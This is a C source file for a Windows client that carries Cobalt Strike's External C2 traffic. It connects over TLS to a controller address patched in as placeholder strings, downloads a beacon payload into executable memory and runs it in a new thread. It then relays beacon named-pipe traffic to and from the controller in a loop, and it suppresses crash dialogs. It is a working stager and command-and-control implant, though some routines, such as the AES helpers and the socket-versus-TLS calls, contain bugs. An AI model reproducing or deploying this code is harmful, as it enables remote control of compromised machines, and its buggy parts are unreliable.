/**
 * client.c
 * by Daniel Fitzgerald
 *
 * Program to provide basic TCP communications for Cobalt Strike using the External C2 feature.
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>
#include <wolfssl/wolfcrypt/aes.h>
#include <wolfssl/ssl.h>
#include <wolfssl/options.h>

#define MAX 4096
// Mudge used these values in his example
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

#define SA struct sockaddr

#ifdef DEBUG
	#define _DEBUG 1
#else
	#define _DEBUG 0
#endif

#define debug_print(fmt, ...) \
            do { if (_DEBUG) fprintf(stderr, fmt, __VA_ARGS__); } while (0)


/**
 * Encrypt with AES CBC 256bit
 * 
 * @param aes pointer to the AES structure to modify
 * @param key secret key to encrypt/decrypt
 * @param key_size length of key
 * @param buffer input buffer to encrypt
 * @param len length of input buffer
 * @param iv_pad_ciphertxt output buffer containing IV, PAD, then encrypted cipher text
 * @return Error code, 0 on success, -1 on failure
*/
int AesEncrypt(Aes* aes, byte* key, int key_size, char* buffer, int len, char* iv_pad_ciphertxt)
{
	byte iv[AES_BLOCK_SIZE];
	WC_RNG rng;
	int length = len;
	int padCounter = 0;
	int ret = 0;
	int i = 0;

	// pads the length until it evenly matches a block / increases pad number
    while (length % AES_BLOCK_SIZE != 0) {
        length++;
        padCounter++;
    }

	char* cleartxt = malloc(length);
	char* ciphertxt = malloc(length);

	ret = wc_InitRng(&rng);
	if (ret != 0)
	{
		debug_print("%s", "Failed to initialize random number generator\n");
		return -1;
	}

	memcpy(cleartxt, buffer, len);

	for (i = len; i < length; i++)
	{
		// Pads the added characters with the number of pads
		cleartxt[i] = padCounter;
	}

	// Generate IV
	ret = wc_RNG_GenerateBlock(&rng, iv, AES_BLOCK_SIZE);
	if (ret != 0)
	{
		debug_print("%s", "Failed to generate rng block\n");
		return -1;
	}

	// Set key
	ret = wc_AesSetKey(aes, key, AES_BLOCK_SIZE, iv, AES_ENCRYPTION);
	if (ret != 0)
	{
		debug_print("%s", "Failed to set aes key\n");
		return -1;
	}

	// Encrypt message
	ret = wc_AesCbcEncrypt(aes, ciphertxt, cleartxt, length);
	if (ret != 0)
	{
		debug_print("%s", "Failed to encrypt message\n");
		return -1;
	}

	// Need to free this elsewhere
	iv_pad_ciphertxt = malloc(AES_BLOCK_SIZE + sizeof(padCounter) + length);
	memcpy(iv_pad_ciphertxt, iv, AES_BLOCK_SIZE);
	memcpy(iv_pad_ciphertxt, padCounter, sizeof(padCounter));
	memcpy(iv_pad_ciphertxt, ciphertxt, length);

	wc_FreeRng(&rng);
	free(ciphertxt);
	free(cleartxt);

	return ret;
}

/**
 * Decrypt with AES CBC 256bit
 * 
 * @param aes pointer to the AES structure to modify
 * @param key secret key to encrypt/decrypt
 * @param key_size length of key
 * @param buffer input buffer to decrypt [IV|PAD|CIPHERTXT]
 * @param len length of input buffer
 * @param cleartxt output buffer containing decrypted message
 * @return Error code, 0 on success, -1 on failure
*/
int AesDecrypt(Aes* aes, byte* key, int key_size, char* buffer, int len, char* cleartxt)
{
	byte iv[AES_BLOCK_SIZE];
	int ret = 0;
	int i = 0;
	// length of just ciphertxt
	int length = len-AES_BLOCK_SIZE;
	
	char* ciphertxt = malloc(length);
	char* cleartxt_padded = malloc(length);

	for (i = 0; i < AES_BLOCK_SIZE; i++)
	{
		// Find iv from input buffer
		iv[i] = buffer[i];
	}

	// Set key
	ret = wc_AesSetKey(aes, key, AES_BLOCK_SIZE, iv, AES_DECRYPTION);
	if (ret != 0)
	{
		debug_print("%s", "Failed to set decrypt key\n");
		return -1;
	}

	// Copy just cipher text, free this elsewhere
	memcpy(ciphertxt, buffer+AES_BLOCK_SIZE, length);
	
	// Decrypt message
	ret = wc_AesCbcDecrypt(aes, cleartxt, ciphertxt, length);
	if (ret != 0)
	{
		debug_print("%s", "Failed to decrypt message\n");
		return -1;
	}

	if (buffer[AES_BLOCK_SIZE] != 0)
	{
		length -= ciphertxt[length-1];
	}
	cleartxt = malloc(length);
	memcpy(cleartxt, cleartxt_padded, length);

	free(ciphertxt);
	free(cleartxt_padded);
	return ret;
}

/**
 * Creates a socket connection in Windows
 *
 * @param ip A pointer to an array containing the IP address to connect to
 * @param port A pointer to an array containing the port to connect on
 * @param timeout_sec An int to specify socket timeout
 * @return A socket handle for the connection
*/
SOCKET create_socket(char* ip, char* port, int timeout_sec)
{
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		debug_print("WSAStartup failed with error: %d\n", iResult);
		return INVALID_SOCKET;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		debug_print("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		debug_print("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Set socket timeout
	// Note: Windows timeout value is a DWORD in milliseconds, address passed to setsockopt() is const char *
	if (setsockopt (ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout_sec, sizeof(timeout_sec)) < 0) {
			debug_print("%s", "setsockopt rcvtimeout failed\n");
			return INVALID_SOCKET;
		}
	if (setsockopt (ConnectSocket, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout_sec, sizeof(timeout_sec)) < 0) {
        	debug_print("%s", "setsockopt sndtimeout failed\n");
			return INVALID_SOCKET;
		}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		debug_print("%s", "Error at connect()\n");
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		debug_print("%s", "Unable to connect to server!\n");
		WSACleanup();
		return INVALID_SOCKET;
	}
	return ConnectSocket;
}


/**
 * Sends data to server received from our injected beacon
 *
 * @param ssl A pointer to the ssl session
 * @param data A pointer to an array containing data to send
 * @param len Length of data to send
 * @return Number of bytes sent
*/
int sendData(WOLFSSL* ssl, const char* data, DWORD len) {
	int iResult;
	iResult = wolfSSL_write(ssl, (char *)&len, 4);
	if (iResult == SOCKET_ERROR)
	{
		debug_print("Send failed: %d\n", WSAGetLastError());
		debug_print("SSL Send failed: %d\n", wolfSSL_get_error(ssl, 0));
		return -1;
	}
	iResult = wolfSSL_write(ssl, data, len);
	if (iResult == SOCKET_ERROR)
	{
		debug_print("Send failed: %d\n", WSAGetLastError());
		debug_print("SSL Send failed: %d\n", wolfSSL_get_error(ssl, 0));
		return -1;
	}
	else if (iResult != len)
	{
		debug_print("WARNING: Sent %d bytes, len was %d!\n", iResult, len);
	}
	return iResult;
}


/**
 * Receives data from our C2 controller to be relayed to the injected beacon
 *
 * @param ssl A pointer to the ssl session
 * @param buffer Buffer to store data in
 * @param len Length of data to send
 * @return Size of data recieved
*/
DWORD recvData(WOLFSSL* ssl, char * buffer, DWORD max) {
	DWORD size = 0, total = 0, temp = 0;
	int iResult;

	/* read the 4-byte length */
	iResult = wolfSSL_read(ssl, (char *)&size, 4);
	if (iResult == 0)
	{
		debug_print("Recv failed: %d\n", WSAGetLastError());
		debug_print("SSL Recv failed: %d\n", wolfSSL_get_error(ssl, 0));
		return -1;
	}

	/* read in the result */
	while (total < size) {
		temp = wolfSSL_read(ssl, buffer + total, size - total);
		if (temp == 0)
		{
			debug_print("Recv failed: %d\n", WSAGetLastError());
			debug_print("SSL Recv failed: %d\n", wolfSSL_get_error(ssl, 0));
			return -1;
		}
		total += temp;
	}
	if (size != total)
	{
		debug_print("WARNING: Size is %d, total recv is %d\n", size, total);
	}

	return size;
}


/**
 * Read a frame from a handle
 * 
 * @param my_handle Handle to beacons SMB pipe
 * @param buffer buffer to read data into
 * @param max unused
 * @return size of data read
 */
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;
	/* read the 4-byte length */
	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}


/**
 * Write a frame to a file
 * 
 * @param my_handle Handle to beacons SMB pipe
 * @param buffer buffer containing data to send
 * @param length length of data to send
 */
void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}


/**
 * Main function. Connects to server over TCP, gets beacon and spawns it, then enters send/recv loop
 *
 */
void main(int argc, char* argv[])
{
	// Set connection info
	if (argc != 1)
	{
		debug_print("Incorrect number of args: %d\n", argc);
		debug_print("Incorrect number of args: %s\n", argv[0]);
		exit(1);
	}

	// Disable crash messages
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
	// _set_abort_behavior(0,_WRITE_ABORT_MSG);

	//char* IP = argv[1];
	char IP[50] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	//char* PORT = argv[2];
	char PORT[50] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
	
	char pipe_str[50] = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";
	//strncpy(pipe_str, argv[3], sizeof(pipe_str));

	int sleep;
	//sleep = atoi(argv[4]);
	sleep = atoi("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD");


	int TIMEOUT_SEC;
	//TIMEOUT_SEC = atoi(argv[5])*1000;
	TIMEOUT_SEC = atoi("EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE")*1000;

	//char key[32] = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
	//Aes aes;
	char pem[2048] = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";

	WOLFSSL_CTX* ctx;
	WOLFSSL* ssl;
	WOLFSSL_METHOD* method;

	DWORD payloadLen = 0;
	char* payloadData = NULL;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	// Create a connection back to our C2 controller
	SOCKET sockfd = INVALID_SOCKET;

	sockfd = create_socket(IP, PORT, TIMEOUT_SEC);
	if (sockfd == INVALID_SOCKET)
	{
		debug_print("%s", "Socket creation error!\n");
		exit(1);
	}

	// Initialize ssl library
	wolfSSL_Init();
	// Use TLS 1.2
	method = wolfTLSv1_2_client_method();
	// Make new ssl context
	if ( (ctx = wolfSSL_CTX_new(method)) == NULL)
	{
		debug_print("%s", "SSL CTX new error\n");
		exit(1);
	}
	// Make new ssl struct
	if ( (ssl = wolfSSL_new(ctx)) == NULL)
	{
		debug_print("%s", "SSL new error\n");
		exit(1);
	}
	// Add cert to ctx
	if (wolfSSL_CTX_load_verify_buffer(ctx, pem, sizeof(pem), SSL_FILETYPE_PEM) != SSL_SUCCESS)
	{
		debug_print("%s", "Pem load failed\n");
		exit(1);
	}
	// Connect wolfssl to socket
	wolfSSL_set_fd(ssl, sockfd);
	wolfSSL_connect(ssl);

	// Recv beacon payload
	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (payload == NULL)
	{
		debug_print("%s", "payload buffer malloc failed!\n");
		exit(1);
	}
	DWORD payload_size = recvData(sockfd, payload, PAYLOAD_MAX_SIZE);
	if (payload_size < 0)
	{
		debug_print("%s", "recvData error, exiting\n");
		free(payload);
		exit(1);
	}
	debug_print("Recv %d byte payload from TS\n", payload_size);
	/* inject the payload stage into the current process */
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
	// Loop unstil the pipe is up and ready to use
	while (beaconPipe == INVALID_HANDLE_VALUE) {
		// Create our IPC pipe for talking to the C2 beacon
		Sleep(500);
		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
		char pipestr[50+13]= "\\\\.\\pipe\\";
		// Pipe str (i.e. "mIRC")
		strcat(pipestr, pipe_str);
		// Full string (i.e. "\\\\.\\pipe\\mIRC")
		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	}
	debug_print("%s", "Connected to pipe!!\n");

	// Mudge used 1MB max in his example, this may be because SMB beacons are only able to send 1MB of data within each response.
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
	if (buffer == NULL)
	{
		debug_print("%s", "buffer malloc failed!\n");
		free(payload);
		exit(1);
	}

	while (1) {
		// Start the pipe dance
		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
		if (read_size <= 0)
		{
			debug_print("%s", "read_frame error, exiting\n");
			break;
		}
		debug_print("Recv %d bytes from beacon\n", read_size);
		
		if (read_size == 1)
		{
			debug_print("Finished sending, sleeping %d seconds..\n", sleep);
			// Close TCP connection, sleep, open new TCP connection
			wolfSSL_free(ssl);
			closesocket(sockfd);
			sockfd = INVALID_SOCKET;

			Sleep(sleep*1000);

			sockfd = create_socket(IP, PORT, TIMEOUT_SEC);
			if (sockfd == INVALID_SOCKET)
			{
				debug_print("%s", "Socket creation error!\n");
				free(payload);
				free(buffer);
				wolfSSL_free(ssl);
				wolfSSL_CTX_free(ctx);
				wolfSSL_Cleanup();
				CloseHandle(beaconPipe);
				exit(1);
			}
			// Connect wolfssl to socket
			wolfSSL_set_fd(ssl, sockfd);
			wolfSSL_connect(ssl);
		}

		int send_size = sendData(sockfd, buffer, read_size);
		if (send_size < 0)
		{
			debug_print("%s", "sendData error, exiting\n");
			break;
		}
		debug_print("%s", "Sent to TS\n");
		
		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
		if (read_size <= 0)
		{
			debug_print("%s", "recvData error, exiting\n");
			break;
		}
		debug_print("Recv %d bytes from TS\n", read_size);

		write_frame(beaconPipe, buffer, read_size);
		debug_print("%s", "Sent to beacon\n");
	}
	free(payload);
	free(buffer);
	wolfSSL_free(ssl);
	wolfSSL_CTX_free(ctx);
	wolfSSL_Cleanup();
	closesocket(sockfd);
	CloseHandle(beaconPipe);

	exit(0);
}

